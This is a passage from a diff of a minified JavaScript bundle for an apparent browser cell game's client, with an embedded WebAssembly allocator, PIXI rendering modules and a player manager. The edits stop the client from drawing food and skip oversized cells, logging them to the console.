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"),
+                            t = this.instance = await WebAssembly.instantiate(await WebAssembly.compile(await e.arrayBuffer()), {
+                                env: {
+                                    addOrUpdate(e, t, s, a, n, o, r, l, c) {
+                                        let {
+                                            playback: h
+                                        } = i;
+                                        if (h.dry) {
+                                            let {
+                                                updates: d
+                                            } = h, p = d[0][0];
+                                            p[a] = {
+                                                type: t,
+                                                pid: s,
+                                                id: a,
+                                                x: n,
+                                                y: o,
+                                                size: r,
+                                                flags: l
+                                            };
+                                            return
+                                        }
+                                        n = 32 & t ? void 0 : n, r = 64 & t ? void 0 : r, g(15 & t, s, a, n, o, r, l, c, e)
+                                    },
+                                    destroy(e, t) {
+                                        let {
+                                            playback: s
+                                        } = i;
+                                        if (s.dry) {
+                                            s.destroyCell(t);
+                                            return
+                                        }
+                                        m(t, e)
+                                    },
+                                    eat(e, t, s) {
+                                        let {
+                                            playback: a
+                                        } = i;
+                                        if (a.dry) {
+                                            a.eatCell(t, s);
+                                            return
+                                        }
+                                        A(t, s, e)
+                                    },
+                                    emscripten_notify_memory_growth(e) {}
+                                }
+                            }),
+                            {
+                                memory: s
+                            } = t.exports;
+                        return this.HEAPU8 = new Uint8Array(s.buffer), this.HEAPU16 = new Uint8Array(s.buffer), this.HEAPF32 = new Uint8Array(s.buffer), this.HEAPU32 = new Uint8Array(s.buffer), delete this.initializing, !0
+                    }
+                    deserialize(e, t, s) {
+                        if (!this.instance) return 0;
+                        let {
+                            deserialize: i,
+                            malloc: a,
+                            free: n
+                        } = this.instance.exports, o = t.byteLength, r = a(o);
+                        this.HEAPU8.set(t, r), i(r, s, e), n(r)
+                    }
+                };
+            v.init(), window.Module = v, i.parseCells = e => v.deserialize(1, new Uint8Array(e.buffer, 1), e.packetId), e.exports = {
+                wasmModule: v,
+                addOrUpdateCell: g,
+                destroyCell: m,
+                eatCell: A
+            }
+        }, function(e, t, s) {
+            var i = s(140);
+
+            function a(e, t, s, a) {
+                var n = e.length,
+                    o = i._malloc(n),
+                    r = new Uint8Array(i.HEAPU8.buffer, o, n);
+                r.set(e);
+                var l = t(o, a);
+                if (!s) {
+                    var c = new Uint8Array(new ArrayBuffer(n));
+                    c.set(r)
+                }
+                return i._free(o), s ? l : c
+            }
+            s(141), e.exports = {
+                skid: e => a(e, i._skid, !1),
+                skid3: (e, t) => a(e, i._skid3, !0, t),
+                skid4: (e, t) => a(e, i._skid4, !0, t)
+            }
+        }, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , function(e, t, s) {
+            "use strict";
+            var i = s(74),
+                a = s(30),
+                n = Object((s(168), s(0)).a)(a.default, i.a, i.b, !1, null, "0eaeaf66", null);
+            n.options.__file = "src/components/modal.vue", t.default = n.exports
+        }, function(e, t, s) {
+            "use strict";
+            var i = s(75),
+                a = s(38),
+                n = Object((s(218), s(0)).a)(a.default, i.a, i.b, !1, null, "1dbc6ed9", null);
+            n.options.__file = "src/components/replay-item.vue", t.default = n.exports
+        }, function(e, t, s) {
+            "use strict";
+            var i = s(73),
+                a = s(55),
+                n = Object((s(250), s(0)).a)(a.default, i.a, i.b, !1, null, "4c95bd45", null);
+            n.options.__file = "src/components/minimap.vue", t.default = n.exports
+        }, function(e, t, s) {
+            "use strict";
+            s(17).notifyUnsupportedBrowser(), s(1), s(130), s(132), s(142), s(148), s(269), s(267), s(268)
+        }, function(e, t, s) {
+            var i = s(2),
+                a = s(120);
+            "string" == typeof(a = a.__esModule ? a.default : a) && (a = [
+                [e.i, a, ""]
+            ]);
+            var n = (i(a, {
+                insert: "head",
+                singleton: !1
+            }), a.locals ? a.locals : {});
+            e.exports = n
+        }, function() {}, function(e, t, s) {
+            let i, a = s(4),
+                n = s(12),
+                o = ({
+                    width: e,
+                    height: t,
+                    circle: s
+                }) => {
+                    let i = PIXI.utils.string2hex(a.borderColor),
+                        n = new PIXI.Graphics;
+                    return n.lineStyle(100, i, 1, .5), s ? n.drawEllipse(e / 2, t / 2, e / 2, t / 2) : n.drawRect(0, 0, e, t), n.endFill(), n.pivot.set(e / 2, t / 2), n
+                },
+                r = ({
+                    width: e,
+                    height: t
+                }) => {
+                    let s = new PIXI.Graphics().beginFill(16777215).drawEllipse(e / 2, t / 2, e / 2, t / 2).endFill();
+                    return s.pivot.set(e / 2, t / 2), s
+                };
+            e.exports = class e {
+                constructor(e, t) {
+                    this.border = e, this.container = new PIXI.Container, this.background = new PIXI.Container, this.borderSprite = o(e), this.background.addChild(this.borderSprite), this.foreground = new PIXI.Container, this.food = new PIXI.Container, this.food.visible = a.foodVisible, this.resetMassTextStyle(!1), this.container.addChild(this.background, this.food, this.foreground), this.setPosition(), t && this.setBackgroundImage(), this.background.position.x = e.x, this.background.position.y = e.y
+                }
+                static useGame(e) {
+                    i = e
+                }
+                setPosition() {
+                    this.container.position.x = window.innerWidth / 2, this.container.position.y = window.innerHeight / 2
+                }
+                sort() {
+                    this.foreground.children.sort((e, t) => (e = e.gameData).size === (t = t.gameData).size ? e.id - t.id : e.size - t.size)
+                }
+                addCell(e) {
+                    if(e.gameData.size<3000){
+                        this.foreground.addChild(e)
+                        
+                    } else {
+                        if (typeof e.gameData.isMe !== "undefined" && (e.gameData.isMe === true || e.gameData.isMe === false)) {
+                            console.log("Problematic Player texture size");
+                            console.log("isMe:", e.gameData.isMe);
+                            console.log(e.gameData); 
+                        } else {
+                            console.log("Other problem size");
+                        }
+
+                    }
+                }
+                addFood(e) {
+                    //this.food.addChild(e);
+                    return
+                }
+                toggleBackgroundImage(e) {
+                    e && !this.backgroundSprite ? this.setBackgroundImage() : e || this.destroyBackgroundImage(!0)
+                }
+                setBackgroundImage() {
+                    let e = a.backgroundImageUrl;
+                    if (!e) {
+                        this.destroyBackgroundImage();
+                        return
+                    }
+                    let t = (a.backgroundImageRepeat ? PIXI.TilingSprite : PIXI.Sprite).from(e, {});
+                    t.width = this.border.width, t.height = this.border.height, t.alpha = a.backgroundImageOpacity, t.anchor.set(.5);
+                    let s = this.backgroundSprite;
+                    if (s) {
+                        let i = t.texture !== s.texture;
+                        this.destroyBackgroundImage(i)
+                    }
+                    if (this.backgroundSprite = t, this.background.addChildAt(t, 0), !this.border.circle) return;
+                    let n = r(this.border);
+                    this.background.addChildAt(n, 1), this.backgroundSprite.mask = n
+                }
+                destroyBackgroundImage(e) {
+                    this.backgroundSprite && (this.backgroundSprite.destroy(!!e), delete this.backgroundSprite)
+                }
+                resetBorder() {
+                    this.borderSprite.destroy(), this.borderSprite = o(this.border), this.background.addChild(this.borderSprite)
+                }
+                reloadFoodTextures() {
+                    i.allCells.forEach(e => {
+                        e.isFood && e.reloadTexture()
+                    })
+                }
+                reloadEjectedTextures() {
+                    i.allCells.forEach(e => {
+                        e.isEjected && e.reloadTexture()
+                    })
+                }
+                reloadVirusTexture() {
+                    n.virus.loadVirusFromUrl(a.virusImageUrl)
+                }
+                resetPlayerLongNames() {
+                    i.playerManager.players.forEach(e => e.applyNameToSprite())
+                }
+                resetNameTextStyle() {
+                    [...i.allCells.values()].filter(e => !!e.isPlayerCell).forEach(e => {
+                        e.nameSprite && (e.nameSprite.destroy(!1), e.nameSprite = null)
+                    });
+                    let e = a.nameTextStyle;
+                    i.playerManager.players.forEach(t => {
+                        let s = t.nameSprite;
+                        if (!s) return;
+                        let i = s.style.fill;
+                        s.style = e, s.style.fill = i, s.updateText()
+                    })
+                }
+                resetMassTextStyle(e) {
+                    e && this.uninstallMassTextFont();
+                    let t = a.massTextStyle;
+                    for (PIXI.BitmapFont.from("mass", t, {
+                            chars: "1234567890k."
+                        }); i.massTextPool.length;) i.massTextPool.pop().destroy(!1);
+                    [...i.allCells.values()].filter(e => !!e.isPlayerCell).forEach(e => {
+                        e.massText && e.sprite && (e.sprite.removeChild(e.massText), e.massText.destroy(!1), e.massText = null)
+                    })
+                }
+                uninstallMassTextFont() {
+                    PIXI.BitmapFont.uninstall("mass")
+                }
+            }
+        }, function(e, t, s) {
+            var i = s(4),
+                a = s(24),
+                n = {};
+            e.exports = {
+                getTexture: function(e) {
+                    var t, s, o, r, l, c, h, d;
+                    return n[e] || (n[e] = (t = e, (h = (s = c = (l = i.cellSize) / 2, o = t, (r = new PIXI.Graphics).beginFill(o), r.drawCircle(0, 0, s), r.endFill(), r)).position.set(c), d = PIXI.RenderTexture.create(l, l), a.render(h, d), d))
+                },
+                destroyCache: function() {
+                    for (var e in n) n[e].destroy(!0), delete n[e]
+                }
+            }
+        }, function(e, t, s) {
+            var i = s(4),
+                a = s(24),
+                n = {};
+            e.exports = {
+                getTexture: function(e) {
+                    var t, s, o, r, l, c, h, d;
+                    return n[e] || (n[e] = (t = e, (h = (s = c = (l = i.cellSize) / 2, o = t, (r = new PIXI.Graphics).beginFill(o), r.drawRect(-s, -s, 2 * s, 2 * s), r.endFill(), r)).position.set(c), d = PIXI.RenderTexture.create(l, l), a.render(h, d), d))
+                },
+                destroyCache: function() {
+                    for (var e in n) n[e].destroy(!0), delete n[e]
+                }
+            }
+        }, function(e, t, s) {
+            var i = s(24),
+                {
+                    loadImage: a
+                } = s(8),
+                n = PIXI.RenderTexture.create(200, 200),
+                o = Promise.resolve();
+            e.exports = {
+                getTexture: function() {
+                    return n
+                },
+                loadVirusFromUrl: async function(e) {
+                    await o, o = new Promise(async t => {
+                        var s = await a(e),
+                            o = PIXI.Sprite.from(s, void 0, 18);
+                        o.width = o.height = 200, i.render(o, n, !0), o.destroy(!0), t()
+                    })
+                }
+            }
+        }, function(e, t, s) {
+            let i, a = s(126);
+            e.exports = class e {
+                constructor() {
+                    this.playersRemoving = [], this.players = new Map, this.botCount = 0
+                }
+                static useGame(e) {
+                    i = e, a.useGame(e)
+                }
+                get playerCount() {
+                    return this.players.size - this.botCount
+                }
+                getPlayer(e) {
+                    return this.players.has(e) ? this.players.get(e) : null
+                }
+                setPlayerData({
+                    pid: e,
+                    nickname: t,
+                    skin: s,
+                    skinUrl: i,
+                    perk_color: n,
+                    tagId: o,
+                    bot: r
+                }) {
+                    !this.players.has(e) && (this.players.set(e, new a(e, r)), r && this.botCount++);
+                    let l = this.players.get(e);
+                    s && (i = `https://skins.vanis.io/s/${s}`);
+                    let c = l.setName(t, n),
+                        h = l.setSkin(i),
+                        d = l.setTagId(o);
+                    return (c || h || d) && l.invalidateVisibility(), l
+                }
+                invalidateVisibility(e = []) {
+                    for (let t of this.players.values()) 0 > e.indexOf(t) && t.invalidateVisibility()
+                }
+                sweepRemovedPlayers() {
+                    let {
+                        replay: e
+                    } = i, t = e.packets[0], s = t[0]?.packetId, a = 0;
+                    for (; a < this.playersRemoving.length;) {
+                        let n = this.playersRemoving[a];
+                        if (!this.players.has(n)) {
+                            this.playersRemoving.splice(a, 1);
+                            continue
+                        }
+                        let o = this.players.get(n);
+                        s && o.lastUpdateTick && !(s > o.lastUpdateTick) ? a++ : (this.removePlayer(n), this.playersRemoving.splice(a, 1))
+                    }
+                }
+                delayedRemovePlayer(e) {
+                    this.playersRemoving.push(e)
+                }
+                removePlayer(e) {
+                    if (!this.players.has(e)) return;
+                    let t = this.players.get(e);
+                    t.bot && this.botCount--, t.clearCachedData(), this.players.delete(e)
+                }
+                destroy() {
+                    for (let e of this.players.keys()) this.removePlayer(e);
+                    this.botCount = 0, this.playersRemoving.splice(0, this.playersRemoving.length)
+                }
+            }
+        }, function(e, t, s) {
+            let i = s(4),
+                {
+                    basic: a,
+                    basicd: n
+                } = s(76),
+                o = i.cellSize,
+                r = o / 2,
+                l = i.cellBorderSize,
+                c = e => {
+                    e = e || 0;
+                    let t = new PIXI.Graphics().lineStyle(l, 0, .5).beginFill(e).drawCircle(0, 0, r).endFill();
+                    return t
+                },
+                h = null;
+            e.exports = class e {
+                constructor(e, t) {
+                    this.pid = e, this.bot = t || !1, this.skinUrl = null, (e === h.playerId || e === h.multiboxPid) && (this.isMe = !0), this.texture = PIXI.RenderTexture.create(o, o), this.cellContainer = this.createCellContainer(), this.renderCell()
+                }
+                static useGame(e) {
+                    h = e
+                }
+                get visibility() {
+                    return 1 + +(h.tagId !== this.tagId)
+                }
+                setOutline(e, t = 15, s = !1) {
+                    if (this.outlineGraphic && (this.outlineGraphic.destroy(), delete this.outlineGraphic), s) return void this.renderCell();
+                    e = e || 0;
+                    let i = this.outlineGraphic = new PIXI.Graphics().lineStyle(t, e, 1).drawCircle(0, 0, r - (t - 1) / 2).endFill();
+                    i.pivot.set(-r), h.renderer.render(i, this.texture, !1)
+                }
+                setCrown(e) {
+                    this.hasCrown = e;
